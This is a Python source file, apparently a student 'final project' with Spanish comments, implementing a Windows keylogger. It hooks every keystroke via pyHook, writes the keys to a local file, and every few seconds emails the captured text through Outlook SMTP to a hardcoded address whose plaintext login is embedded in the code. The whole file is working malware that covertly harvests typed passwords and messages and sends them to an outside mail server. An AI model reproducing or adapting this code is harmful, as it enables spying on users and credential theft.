import email, smtplib, time, pythoncom, pyHook, logging
from email import message
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

carpeta_destino= "C:\\Users\\camil\\Desktop\\KeyLogger\\KeyLogger.txt"
segundos_espera= 9
timeout = time.time() + segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else: 
        return False

def enviarCorreo():  
    with open(carpeta_destino, 'r+') as f: 
        KeyLogger = f.read() #Lee el archivo ingresado
        KeyLogger = KeyLogger.replace('Space', ' ') #Cambia la palabra espacio por espacios de verdad
        KeyLogger = KeyLogger.replace('\n', '') #Cambia los saltos de lineas por espacos
        KeyLogger = KeyLogger.replace('Return', '\n') #Cambia lhola

        f.seek(0)
        f.truncate()    
        
    msg = MIMEMultipart()
    msg['From'] = "projectkeylogger@outlook.com"
    msg['To'] = "projectkeylogger@outlook.com"
    msg['Subject'] = "Proyecto Final"

    msg.attach(MIMEText(KeyLogger, 'plain'))

    try:
        s = smtplib.SMTP("smtp-mail.outlook.com",587)
        s.ehlo() 
        s.starttls()
        s.login('projectkeylogger@outlook.com', 'keylogger123')
        s.sendmail("projectkeylogger@outlook.com", "projectkeylogger@outlook.com", msg.as_string())
        s.quit()
        print('Correo enviado con exito')
    except:
        print('Correo fallido')

def OnKeyBoardEvent(event): #Eventos en pantalla
    logging.basicConfig(filename = carpeta_destino, level = logging.DEBUG, format='%(message)s') #Configuracion basica
    print('windowName', event.WindowName)
    print('Window:', event.Window)    
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager() #Logger
hooks_manager.KeyDown = OnKeyBoardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut(): #cada 7 segundos nos manda el correo con todo lo que ha capturado
        enviarCorreo()
        timeout = time.time() + segundos_espera

    pythoncom.PumpWaitingMessages()